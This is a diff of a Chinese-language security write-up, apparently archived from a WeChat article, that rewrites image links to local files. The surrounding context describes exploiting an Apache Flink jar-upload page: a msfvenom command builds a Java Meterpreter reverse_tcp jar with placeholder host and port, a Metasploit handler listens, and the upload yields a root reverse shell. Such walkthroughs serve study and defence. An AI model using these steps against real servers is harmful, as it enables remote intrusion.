@@ -71,11 +71,11 @@ http://x.x.x.x
 
 打开一个使用 Apache Flink 的网站，打开后页面为这样子  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQbCfFBZ47ufHrtVP0eFIaicLpYe4icd5CX2QUUW6bYhbiabSdIeGopXcBg/640?wx_fmt=png)
+![](../../.resource/remote/b5a7350ea9a89c2711992e495fac803eec00fdb9ad89901855aa483c242d8418.png)
 
 点击查看文件上传页面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQnL6qq4xOG5yETdQSn3qibvTlE7oiaIXjc0icHnTFUUaNHLnGEATXHFfAA/640?wx_fmt=png)
+![](../../.resource/remote/ab60e50883f27e6d3968e06dba242993d002023efcd34d6e3c6e9fb578d0cbac.png)
 
 打开 MSF 生成一个 jar 木马
 
@@ -86,7 +86,7 @@ msfvenom ‐p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx‐f jar > tes
 
 点击 Add 上传 jar 文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQnL6qq4xOG5yETdQSn3qibvTlE7oiaIXjc0icHnTFUUaNHLnGEATXHFfAA/640?wx_fmt=png)
+![](../../.resource/remote/ab60e50883f27e6d3968e06dba242993d002023efcd34d6e3c6e9fb578d0cbac.png)
 
 msf 进行监听端口
 
@@ -106,19 +106,19 @@ msf5 > use exploit/multi/handler
 
 如下
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQuGeJ1ibNXyXd2mW5VcSficXlfLWxjl5OJUQIznh3dII6YWAJapcrjvjw/640?wx_fmt=png)
+![](../../.resource/remote/f14909326d53d7c202f1139e68810327e8433bb7bccc55517ce476f2e1cb53ae.png)
 
 点击下 submit
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQOzKXibdt2r38PnVIy6YswDMu0B3qGgNZNZnGEXtwxbgQiaKw8upIrEUA/640?wx_fmt=png)
+![](../../.resource/remote/2a5b3854487e854bd9e8bb0108cb8790ffb675662681a26dda1e055dc954e325.png)
 
 直接反弹回来一个 root 权限的 shell  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQtfoOAS3gFGp4UrlxtjIwuZ0xibAAhltvNfcwh6Asa95e1KNrNjaJCDg/640?wx_fmt=png)
+![](../../.resource/remote/8d37b24aa85a22990494747261339c7ca423f902b19fe1be52990108c1e9585c.png)
 
 漏洞利用 POC
 
-![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwom3e1ZmCTQJeEEAIrRDOQYdbt89g7jAqPED9sRgJ4mjd0koHxjl3bwQMYHZB7Vh2fGnOhcRKfqQ/640?wx_fmt=png)
+![](../../.resource/remote/adf5a4a27fbab4d8d76f7948b393b031d35c4bb802ad7ef304c7049f5b8752ff.png)
 
 文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。
 
